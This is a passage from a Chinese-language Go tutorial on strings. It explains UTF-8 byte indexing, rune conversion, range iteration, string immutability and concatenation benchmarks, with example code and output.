<code>&#39;&#39;</code> 包裹起来，使用双引号 <code>&quot;&quot;</code> 包裹的是字符串！</p><h4 id="3-4-2-字符串的截取是以字节为单位"><a href="#3-4-2-字符串的截取是以字节为单位" class="headerlink" title="3.4.2 字符串的截取是以字节为单位"></a>3.4.2 字符串的截取是以字节为单位</h4><p>使用 <code>len()</code> 函数获取字符串长度时，获取到的是该 <code>UTF-8</code> 编码字符串的字节长度。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s := <span class="hljs-string">&quot;我是&quot;</span> <span class="hljs-comment">// 字符串中是两个中文汉字</span>fmt.Println(<span class="hljs-string">&quot;len(c)=&quot;</span>, <span class="hljs-built_in">len</span>(s))fmt.Printf(<span class="hljs-string">&quot;s[1], value=%v, char=%c\n&quot;</span>, s[<span class="hljs-number">1</span>], s[<span class="hljs-number">1</span>])fmt.Println(<span class="hljs-string">&quot;s[:3]=&quot;</span>, s[:<span class="hljs-number">2</span>])fmt.Println(<span class="hljs-string">&quot;s[:3]=&quot;</span>, s[:<span class="hljs-number">3</span>])&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">len(c)= 6</span><span class="hljs-comment">s[1], value=136, char=ˆ</span><span class="hljs-comment">s[:3]= �</span><span class="hljs-comment">s[:3]= 我</span><span class="hljs-comment">*/</span></code></pre><p>在中文字符串中肆意乱截取，很大概率会输出乱码。<br>由 len(s) 可以得知，此例中字符串 s 的长度为 6，而字符串中只有 2 个汉字。因此，在 Golang 中，一个汉字占 3 个字节。一个汉字由 3 个字节编码而成，使用下标取值时，只是取到了某一个字节的值而已。</p><h4 id="3-4-3-对字符串的索引，只会一个-byte-值"><a href="#3-4-3-对字符串的索引，只会一个-byte-值" class="headerlink" title="3.4.3 对字符串的索引，只会一个 byte 值"></a>3.4.3 对字符串的索引，只会一个 <code>byte</code> 值</h4><p>Golang 使用 <code>UTF-8</code> 编码方式存储、处理字符串，最终是以 <code>Unicode</code> 字符集的形式来表现字符串。<code>Unicode</code> 字符集最终也是用整数数值的方式来呈现的。<br>因此，对字符串的索引操作，会返回一个 <code>byte</code> 值，而不是一个具体显示内容的字符。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s := <span class="hljs-string">&quot;我是gopher&quot;</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(s); i++ &#123;fmt.Printf(<span class="hljs-string">&quot;s[%d], %%d=%d, %%c=%c\n&quot;</span>, i, s[i], s[i])&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">s[0], %d=230, %c=æ</span><span class="hljs-comment">s[1], %d=136, %c=ˆ</span><span class="hljs-comment">s[2], %d=145, %c=‘</span><span class="hljs-comment">s[3], %d=230, %c=æ</span><span class="hljs-comment">s[4], %d=152, %c=˜</span><span class="hljs-comment">s[5], %d=175, %c=¯</span><span class="hljs-comment">s[6], %d=103, %c=g</span><span class="hljs-comment">s[7], %d=111, %c=o</span><span class="hljs-comment">s[8], %d=112, %c=p</span><span class="hljs-comment">s[9], %d=104, %c=h</span><span class="hljs-comment">s[10], %d=101, %c=e</span><span class="hljs-comment">s[11], %d=114, %c=r</span><span class="hljs-comment">*/</span></code></pre><p>如果字符串中含有中文字符（一个中文字符在 <code>UTF-8</code> 编码方式下，占 3 个字节）。因为是由 3 个字节编码而成，如果按照索引来取含有 <code>UTF-8</code> 编码的字符，就会出现乱码。</p><h4 id="3-4-4-遍历中英文混合字符串的示例"><a href="#3-4-4-遍历中英文混合字符串的示例" class="headerlink" title="3.4.4 遍历中英文混合字符串的示例"></a>3.4.4 遍历中英文混合字符串的示例</h4><p><code>UTF-8</code> 是一种变长的编码方式，字符长度从 1 个字节到 4 个字节不等。而 <code>byte</code> 类型只占 1 个字节。就算你想要使用多个 <code>byte</code> 进行表示，但也无从知晓要处理的 <code>UTF-8</code> 字符究竟占了几个字节。<br>利用 <code>[]int32()</code> 和 <code>[]rune()</code> 将字符串转为 <code>Unicode</code> 字符集（<code>Unicode</code> 的数值），再进行截取。这样就无需考虑字符串中是否含有 <code>UTF-8</code> 字符的情况了。</p><h5 id="3-4-4-1-int32-写法"><a href="#3-4-4-1-int32-写法" class="headerlink" title="3.4.4.1 []int32() 写法"></a>3.4.4.1 <code>[]int32()</code> 写法</h5><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s := <span class="hljs-string">&quot;我是gopher&quot;</span>fmt.Println(<span class="hljs-string">&quot;s=&quot;</span>, s) <span class="hljs-comment">//fmt.Print()系列函数是输出内容的本身</span><span class="hljs-comment">//Golang使用UTF-8编码方式将字符串存储成Unicode字符集</span><span class="hljs-comment">//UTF-8编码方式下，一个中文占3个字节</span><span class="hljs-comment">//[:2]只是取到了前两个字节值而已，所以显示了乱码</span>fmt.Println(<span class="hljs-string">&quot;s[:2]=&quot;</span>, s[:<span class="hljs-number">2</span>])fmt.Println(<span class="hljs-string">&quot;s[1]=&quot;</span>, s[<span class="hljs-number">1</span>])<span class="hljs-comment">//遍历取到的是字符串中的每个字符。如果是中文字符，那么依然是占3个字节，遍历的时候也是取了3个字节</span><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> s &#123;<span class="hljs-comment">//格式化打印是直接显示原本的字符内容</span>fmt.Printf(<span class="hljs-string">&quot;s[%d] : unicode=%v, %%c=%c\n&quot;</span>, i, v, v)&#125;fmt.Println(<span class="hljs-string">&quot;----------------------------------------&quot;</span>)<span class="hljs-comment">//利用[]int32()将字符串存储为Unicode字符集</span>unicodeString := []<span class="hljs-keyword">int32</span>(s)fmt.Println(<span class="hljs-string">&quot;unicodeString value : &quot;</span>, unicodeString) <span class="hljs-comment">//显示的是Unicode字符的数值</span>fmt.Println(<span class="hljs-string">&quot;unicodeString[:3] : &quot;</span>, unicodeString[:<span class="hljs-number">3</span>])<span class="hljs-comment">//遍历的是Unicode字符集切片</span><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> unicodeString &#123;fmt.Printf(<span class="hljs-string">&quot;s[%d] = %v\n&quot;</span>, i, v)&#125;<span class="hljs-comment">//截取到的是Unicode切片中的前2个值</span><span class="hljs-comment">//将这2个值转换为字符串之后再输出</span>fmt.Println(<span class="hljs-keyword">string</span>(unicodeString[:<span class="hljs-number">2</span>]))fmt.Println(unicodeString[:<span class="hljs-number">2</span>]) <span class="hljs-comment">//不转换成字符串只会输出原本的内容。fmt.Print()系列函数是输出内容的本身</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">s= 我是gopher</span><span class="hljs-comment">s[:2]= �</span><span class="hljs-comment">s[1]= 136</span><span class="hljs-comment">s[0] : unicode=25105, %c=我</span><span class="hljs-comment">s[3] : unicode=26159, %c=是</span><span class="hljs-comment">s[6] : unicode=103, %c=g</span><span class="hljs-comment">s[7] : unicode=111, %c=o</span><span class="hljs-comment">s[8] : unicode=112, %c=p</span><span class="hljs-comment">s[9] : unicode=104, %c=h</span><span class="hljs-comment">s[10] : unicode=101, %c=e</span><span class="hljs-comment">s[11] : unicode=114, %c=r</span><span class="hljs-comment">----------------------------------------</span><span class="hljs-comment">unicodeString value :  [25105 26159 103 111 112 104 101 114]</span><span class="hljs-comment">unicodeString[:3] :  [25105 26159 103]</span><span class="hljs-comment">s[0] = 25105</span><span class="hljs-comment">s[1] = 26159</span><span class="hljs-comment">s[2] = 103</span><span class="hljs-comment">s[3] = 111</span><span class="hljs-comment">s[4] = 112</span><span class="hljs-comment">s[5] = 104</span><span class="hljs-comment">s[6] = 101</span><span class="hljs-comment">s[7] = 114</span><span class="hljs-comment">我是</span><span class="hljs-comment">[25105 26159]</span><span class="hljs-comment">*/</span></code></pre><h5 id="3-4-4-2-与-int32-等价的-rune-写法"><a href="#3-4-4-2-与-int32-等价的-rune-写法" class="headerlink" title="3.4.4.2 与 []int32() 等价的 []rune() 写法"></a>3.4.4.2 与 <code>[]int32()</code> 等价的 <code>[]rune()</code> 写法</h5><p><code>[]rune()</code> 将字符串转换为 <code>Unicode</code> 码点。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s := <span class="hljs-string">&quot;我爱 Golang！&quot;</span> <span class="hljs-comment">//感叹号是中文的</span>unicodeRune := []<span class="hljs-keyword">rune</span>(s)fmt.Println(<span class="hljs-string">&quot;unicode value : &quot;</span>, unicodeRune)fmt.Println(<span class="hljs-string">&quot;unicodeRune[:2], unicode value : &quot;</span>, unicodeRune[:<span class="hljs-number">2</span>])fmt.Println(<span class="hljs-string">&quot;string(unicodeRune[:2]) = &quot;</span>, <span class="hljs-keyword">string</span>(unicodeRune[:<span class="hljs-number">2</span>]))fmt.Println(<span class="hljs-string">&quot;string(unicodeRune) : &quot;</span>, <span class="hljs-keyword">string</span>(unicodeRune))&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">unicode value :  [25105 29233 32 71 111 108 97 110 103 65281]</span><span class="hljs-comment">unicodeRune[:2], unicode value :  [25105 29233]</span><span class="hljs-comment">string(unicodeRune[:2]) =  我爱</span><span class="hljs-comment">string(unicodeRune) :  我爱 Golang！</span><span class="hljs-comment">*/</span></code></pre><p>与 3.4.4.1 示例中的原理一致：<code>[]int32()</code> 和 <code>[]rune()</code> 都是将字符串转换成 <code>Unicode</code> 字符数值。无论是截取还是直接打印，得到的都将是 <code>Unicode</code> 数值。若想要看到正常的文字内容，需要将 <code>Unicode</code> 数值转换为字符串后再打印。<br>注：<code>Unicode</code> 和 <code>ASCII</code> 一样，都是一种字符集，<code>UTF-8</code> 是一种编码格式。</p><h5 id="3-4-4-3-range-遍历字符串"><a href="#3-4-4-3-range-遍历字符串" class="headerlink" title="3.4.4.3 range 遍历字符串"></a>3.4.4.3 <code>range</code> 遍历字符串</h5><p><code>range</code> 遍历字符串，得到的是 <code>rune</code> 类型的字符。</p><h6 id="3-4-4-3-1-获取下标的时候，得到的是-uint8-类型"><a href="#3-4-4-3-1-获取下标的时候，得到的是-uint8-类型" class="headerlink" title="3.4.4.3.1 获取下标的时候，得到的是 uint8 类型"></a>3.4.4.3.1 获取下标的时候，得到的是 <code>uint8</code> 类型</h6><p>使用 <code>range</code> 遍历字符串，通过下标去取字符串中的值，得到的是单个字符，字符的本质类型则是 <code>uint8</code>。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s := <span class="hljs-string">&quot;我是gopher&quot;</span><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> s &#123;fmt.Printf(<span class="hljs-string">&quot;current i=%d, %%d=%[2]d, %%c=%[2]c, %%T=%[2]T\n&quot;</span>, i, s[i])&#125;fmt.Println(<span class="hljs-string">&quot;-------- 以下示例为了区别 range 遍历 --------&quot;</span>)<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(s); i++ &#123;fmt.Printf(<span class="hljs-string">&quot;current i=%d, %%d=%[2]d, %%c=%[2]c, %%T=%[2]T\n&quot;</span>, i, s[i])&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">current i=0, %d=230, %c=æ, %T=uint8</span><span class="hljs-comment">current i=3, %d=230, %c=æ, %T=uint8</span><span class="hljs-comment">current i=6, %d=103, %c=g, %T=uint8</span><span class="hljs-comment">current i=7, %d=111, %c=o, %T=uint8</span><span class="hljs-comment">current i=8, %d=112, %c=p, %T=uint8</span><span class="hljs-comment">current i=9, %d=104, %c=h, %T=uint8</span><span class="hljs-comment">current i=10, %d=101, %c=e, %T=uint8</span><span class="hljs-comment">current i=11, %d=114, %c=r, %T=uint8</span><span class="hljs-comment">-------- 以下示例为了区别 range 遍历 --------</span><span class="hljs-comment">current i=0, %d=230, %c=æ, %T=uint8</span><span class="hljs-comment">current i=1, %d=136, %c=ˆ, %T=uint8</span><span class="hljs-comment">current i=2, %d=145, %c=‘, %T=uint8</span><span class="hljs-comment">current i=3, %d=230, %c=æ, %T=uint8</span><span class="hljs-comment">current i=4, %d=152, %c=˜, %T=uint8</span><span class="hljs-comment">current i=5, %d=175, %c=¯, %T=uint8</span><span class="hljs-comment">current i=6, %d=103, %c=g, %T=uint8</span><span class="hljs-comment">current i=7, %d=111, %c=o, %T=uint8</span><span class="hljs-comment">current i=8, %d=112, %c=p, %T=uint8</span><span class="hljs-comment">current i=9, %d=104, %c=h, %T=uint8</span><span class="hljs-comment">current i=10, %d=101, %c=e, %T=uint8</span><span class="hljs-comment">current i=11, %d=114, %c=r, %T=uint8</span><span class="hljs-comment">*/</span></code></pre><p>两段代码有一点区别：<code>for i := range s</code> 只出现了 2 个乱码，而 <code>for i := 0; i &lt; len(s); i++</code> 出现了 6 个乱码。<br>原因：<br>Golang 中，字符串是以 <code>UTF-8</code> 编码格式存放的 <code>Unicode</code> 字符码点，一个中文占 3 个编码字节。<br><code>for i := range s</code> 的时候，虽然是以 <code>[]rune</code> 类型在遍历。但遇到了通过下标去获取字符串中的内容（相当于指定去取字符串中，某个下标值中的内容），只能取到对应下标中的字节码值。第一次，<code>i</code> 是初始值 <code>0</code>；第二次，<code>i</code> 的值则变成了 <code>3</code>。所以，只是对应地去取了这 2 个下标中的内容。<br>而 <code>for i := 0; i &lt; len(s); i++</code> 的时候，就不再是遍历 <code>[]rune</code> 类型了，是逐个逐个地遍历每一个字节，把字符串中的每个字节都遍历到了。</p><h6 id="3-4-4-3-2-获取值的时候，得到的是-int32-类型"><a href="#3-4-4-3-2-获取值的时候，得到的是-int32-类型" class="headerlink" title="3.4.4.3.2 获取值的时候，得到的是 int32 类型"></a>3.4.4.3.2 获取值的时候，得到的是 <code>int32</code> 类型</h6><p>使用 <code>range</code> 遍历字符串的时候，值的部分是 <code>int32</code> 类型。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s := <span class="hljs-string">&quot;我是gopher&quot;</span><span class="hljs-keyword">for</span> i, c := <span class="hljs-keyword">range</span> s &#123;fmt.Printf(<span class="hljs-string">&quot;current i=%d, %%d=%[2]d, %%c=%[2]c, %%T=%[2]T\n&quot;</span>, i, c)&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">current i=0, %d=25105, %c=我, %T=int32</span><span class="hljs-comment">current i=3, %d=26159, %c=是, %T=int32</span><span class="hljs-comment">current i=6, %d=103, %c=g, %T=int32</span><span class="hljs-comment">current i=7, %d=111, %c=o, %T=int32</span><span class="hljs-comment">current i=8, %d=112, %c=p, %T=int32</span><span class="hljs-comment">current i=9, %d=104, %c=h, %T=int32</span><span class="hljs-comment">current i=10, %d=101, %c=e, %T=int32</span><span class="hljs-comment">current i=11, %d=114, %c=r, %T=int32</span><span class="hljs-comment">*/</span></code></pre><p>使用 <code>range</code> 遍历字符串，分别得到下标和具体的值。因为一个中文字符在 Golang 的 <code>UTF-8</code> 编码下占 3 个字节，所以此例中，占用的下标就是 [0 ~ 2]、[3 ~ 5]。<br><code>rune</code> 是 <code>int32</code> 的别名，因此打印类型时，就显示了 <code>rune</code> 它本身的数据类型。</p><h5 id="3-4-4-4-参考文献"><a href="#3-4-4-4-参考文献" class="headerlink" title="3.4.4.4 参考文献"></a>3.4.4.4 参考文献</h5><blockquote><p><a href="https://juejin.im/post/6844903998634328078">https://juejin.im/post/6844903998634328078</a></p></blockquote><h4 id="3-4-5-如何修改字符串中的某个元素"><a href="#3-4-5-如何修改字符串中的某个元素" class="headerlink" title="3.4.5 如何修改字符串中的某个元素"></a>3.4.5 如何修改字符串中的某个元素</h4><p>我想要修改字符串中的某个元素，如何操作？</p><h5 id="3-4-5-1-错误警示"><a href="#3-4-5-1-错误警示" class="headerlink" title="3.4.5.1 错误警示"></a>3.4.5.1 错误警示</h5><p>直接对下标中的元素进行修改：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;str := <span class="hljs-string">&quot;hello&quot;</span>str[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-comment">//报错：cannot assign to str[0]</span>fmt.Println(str)&#125;</code></pre><p>编译就通不过，直接报错。原因：<strong>在 Golang 中，字符串是不可变的</strong>。</p><h5 id="3-4-5-2-正确的操作"><a href="#3-4-5-2-正确的操作" class="headerlink" title="3.4.5.2 正确的操作"></a>3.4.5.2 正确的操作</h5><p>使用 <code>[]byte()</code> 或 <code>[]rune()</code>，先将一个字符串转换成字节切片类型，然后对某个下标中的元素进行修改，最后使用 <code>string()</code> 转换回字符串。</p><h6 id="3-4-5-2-1-单字符构成的字符串"><a href="#3-4-5-2-1-单字符构成的字符串" class="headerlink" title="3.4.5.2.1 单字符构成的字符串"></a>3.4.5.2.1 单字符构成的字符串</h6><p>如果这个字符串都是有单字符构成，那么先将这个字符串转换为 <code>[]byte</code> 类型后，再修改某个下标中的元素，最后将这个 <code>[]byte</code> 类型使用 <code>string()</code> 转换回来。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;str := <span class="hljs-string">&quot;hello&quot;</span>b := []<span class="hljs-keyword">byte</span>(str) <span class="hljs-comment">//先转换成 []byte 类型</span>fmt.Println(b)b[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;x&#x27;</span>str = <span class="hljs-keyword">string</span>(b) <span class="hljs-comment">//再将 []byte 类型转换回字符串类型</span>fmt.Println(str)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">[104 101 108 108 111]</span><span class="hljs-comment">xello</span><span class="hljs-comment">*/</span></code></pre><h6 id="3-4-5-2-2-字符串中有复合字符"><a href="#3-4-5-2-2-字符串中有复合字符" class="headerlink" title="3.4.5.2.2 字符串中有复合字符"></a>3.4.5.2.2 字符串中有复合字符</h6><p>如果一个字符串有复合字符，那么就需要使用 <code>[]rune</code> 或 <code>[]int32</code> 来转换。转换成字节后才能修改，最后依然用 <code>string()</code> 转换回字符串。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;str := <span class="hljs-string">&quot;go 你好&quot;</span>b := []<span class="hljs-keyword">rune</span>(str) <span class="hljs-comment">// []int32() 也可以</span>fmt.Println(str, <span class="hljs-string">&quot;,&quot;</span>, b)fmt.Println(<span class="hljs-keyword">rune</span>(<span class="hljs-string">&#x27;很&#x27;</span>)) <span class="hljs-comment">//单个字符转换，也可以直接写成：fmt.Println(&#x27;很&#x27;)</span>b[<span class="hljs-number">3</span>] = <span class="hljs-number">24456</span>str = <span class="hljs-keyword">string</span>(b)fmt.Println(str)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">go 你好 , [103 111 32 20320 22909]</span><span class="hljs-comment">24456</span><span class="hljs-comment">go 很好</span><span class="hljs-comment">*/</span></code></pre><h4 id="3-4-6-其他类型与字符串的转换"><a href="#3-4-6-其他类型与字符串的转换" class="headerlink" title="3.4.6 其他类型与字符串的转换"></a>3.4.6 其他类型与字符串的转换</h4><h5 id="3-4-6-1-十六进制转换为字符串"><a href="#3-4-6-1-十六进制转换为字符串" class="headerlink" title="3.4.6.1 十六进制转换为字符串"></a>3.4.6.1 十六进制转换为字符串</h5><p>有一个字符串切片，里面的每个元素都是以字符串形式保存的十六进制值。现在要将这些十六进制值，转换为其原本的明文字符内容。</p><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-string">&quot;strconv&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;original := []<span class="hljs-keyword">string</span>&#123;<span class="hljs-string">&quot;30d7&quot;</span>, <span class="hljs-string">&quot;30ed&quot;</span>, <span class="hljs-string">&quot;30b0&quot;</span>, <span class="hljs-string">&quot;30e9&quot;</span>, <span class="hljs-string">&quot;30e0&quot;</span>&#125;<span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> original &#123;<span class="hljs-keyword">if</span> s, err := strconv.ParseInt(v, <span class="hljs-number">16</span>, <span class="hljs-number">32</span>); err == <span class="hljs-literal">nil</span> &#123;fmt.Printf(<span class="hljs-string">&quot;%T\t%d\t%c\n&quot;</span>, v, s, s)&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">panic</span>(err)&#125;&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">string12503プ</span><span class="hljs-comment">string12525ロ</span><span class="hljs-comment">string12464グ</span><span class="hljs-comment">string12521ラ</span><span class="hljs-comment">string12512ム</span><span class="hljs-comment">*/</span></code></pre><h4 id="3-4-7-高性能字符串拼接的几个方式"><a href="#3-4-7-高性能字符串拼接的几个方式" class="headerlink" title="3.4.7 高性能字符串拼接的几个方式"></a>3.4.7 高性能字符串拼接的几个方式</h4><p>将以下几个字符串拼接方式，都放入单独的函数中，最后使用 Go 语言自带的 <code>Benchmark</code> 进行简单的性能测试。<br>设置 1000 次拼接，因此：<code>const Loop = 1000</code></p><h5 id="3-4-7-1-使用-strings-Builder"><a href="#3-4-7-1-使用-strings-Builder" class="headerlink" title="3.4.7.1 使用 strings.Builder"></a>3.4.7.1 使用 <code>strings.Builder</code></h5><p>它使用零值、不拷贝零值、使用内存最小。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StrBuilder</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> str strings.Builder<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; Loop; i++ &#123;str.WriteString(<span class="hljs-string">&quot;a&quot;</span>)&#125;&#125;</code></pre><p>注：<strong>不要拷贝 strings.Builder 的值</strong>。</p><h5 id="3-4-7-2-使用-bytes-Buffer"><a href="#3-4-7-2-使用-bytes-Buffer" class="headerlink" title="3.4.7.2 使用 bytes.Buffer"></a>3.4.7.2 使用 <code>bytes.Buffer</code></h5><p><code>bytes</code> 包的 <code>Buffer</code> 实现了 <code>io.Writer</code> 的接口，使用 <code>bytes.Buffer</code> 的 <code>WriteString()</code> 方法去拼接字符串，时间复杂度为 <code>O(n)</code>。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BytesBuffer</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> buffer bytes.Buffer<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; Loop; i++ &#123;buffer.WriteString(<span class="hljs-string">&quot;a&quot;</span>)&#125;&#125;</code></pre><h5 id="3-4-7-3-使用内建函数-copy"><a href="#3-4-7-3-使用内建函数-copy" class="headerlink" title="3.4.7.3 使用内建函数 copy"></a>3.4.7.3 使用内建函数 <code>copy</code></h5><p>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GoCopy</span><span class="hljs-params">()</span></span> &#123;bs := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">0</span>, Loop)bl := <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; Loop; i++ &#123;bl += <span class="hljs-built_in">copy</span>(bs[bl:], <span class="hljs-string">&quot;a&quot;</span>)&#125;&#125;</code></pre><h5 id="3-4-7-4-使用内建函数-append"><a href="#3-4-7-4-使用内建函数-append" class="headerlink" title="3.4.7.4 使用内建函数 append"></a>3.4.7.4 使用内建函数 <code>append</code></h5><p>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GoAppend</span><span class="hljs-params">()</span></span> &#123;bs := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">0</span>, Loop)<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; Loop; i++ &#123;bs = <span class="hljs-built_in">append</span>(bs, <span class="hljs-string">&#x27;a&#x27;</span>)&#125;&#125;</code></pre><h5 id="3-4-7-5-加号拼接"><a href="#3-4-7-5-加号拼接" class="headerlink" title="3.4.7.5 加号拼接"></a>3.4.7.5 加号拼接</h5><p>使用加号 <code>+</code> 进行拼接。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StrPlus</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> result <span class="hljs-keyword">string</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; Loop; i++ &#123;result += <span class="hljs-string">&quot;a&quot;</span>&#125;&#125;</code></pre><h5 id="3-4-7-6-使用-strings-Repeat"><a href="#3-4-7-6-使用-strings-Repeat" class="headerlink" title="3.4.7.6 使用 strings.Repeat"></a>3.4.7.6 使用 <code>strings.Repeat</code></h5><p>将 N 个字符串 s，连接成一个新的字符串。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StrRepeat</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; Loop; i++ &#123;strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, Loop)&#125;&#125;</code></pre><h5 id="3-4-7-7-编写-Benchmark-测试代码"><a href="#3-4-7-7-编写-Benchmark-测试代码" class="headerlink" title="3.4.7.7 编写 Benchmark 测试代码"></a>3.4.7.7 编写 <code>Benchmark</code> 测试代码</h5><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;testing&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkStrBuilder</span><span class="hljs-params">(b *testing.B)</span></span> &#123;b.ResetTimer()<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;StrBuilder()&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkBytesBuffer</span><span class="hljs-params">(b *testing.B)</span></span> &#123;b.ResetTimer()<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;BytesBuffer()&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkGoCopy</span><span class="hljs-params">(b *testing.B)</span></span> &#123;b.ResetTimer()<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;GoCopy()&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkGoAppend</span><span class="hljs-params">(b *testing.B)</span></span> &#123;b.ResetTimer()<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;GoAppend()&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkStrPlus</span><span class="hljs-params">(b *testing.B)</span></span>  &#123;b.ResetTimer()<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;StrPlus()&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkStrRepeat</span><span class="hljs-params">(b *testing.B)</span></span> &#123;b.ResetTimer()<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;StrRepeat()&#125;&#125;</code></pre><h5 id="3-4-7-8-总结"><a href="#3-4-7-8-总结" class="headerlink" title="3.4.7.8 总结"></a>3.4.7.8 总结</h5><p>在确切知道有多少内容的情况下，可以提前将 <code>append()</code> 和 <code>copy()</code> 这两个内建函数的容量值（也就是 <code>cap</code> ），给申请下来，避免了 <code>cap</code> 的重复检查、扩容。<br>因此，在事先知道字符串的长度时：<code>append()</code> 的性能最高。<code>copy()</code> 的开销最少。<br>如果无法确定字符串内容的多少，最佳的方案就是 <code>strings.Builder</code> 的 <code>WriteString()</code> 方法。</p><h5 id="3-4-7-9-参考文献"><a href="#3-4-7-9-参考文献" class="headerlink" title="3.4.7.9 参考文献"></a>3.4.7.9 参考文献</h5><blockquote><p><a href="https://www.toutiao.com/a6736789153746256396">https://www.toutiao.com/a6736789153746256396</a></p></blockquote><h4 id="3-4-8-字符串不总是-UTF-8-文本"><a href="#3-4-8-字符串不总是-UTF-8-文本" class="headerlink" title="3.4.8 字符串不总是 UTF-8 文本"></a>3.4.8 字符串不总是 <code>UTF-8</code> 文本</h4><p>字符串的值可以包含任何字节，只有当字符串字面量（<code>string literal</code>）使用时，才会是 <code>UTF-8</code>。<br>验证一个字符串是否为 <code>UTF-8</code> 文本，可以使用 <code>unicode/utf8</code> 包下的 <code>utf8.ValidString()</code> 方法。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;s1 := <span class="hljs-string">&quot;ABC&quot;</span>fmt.Println(utf8.ValidString(s1)) <span class="hljs-comment">// true</span>s2 := <span 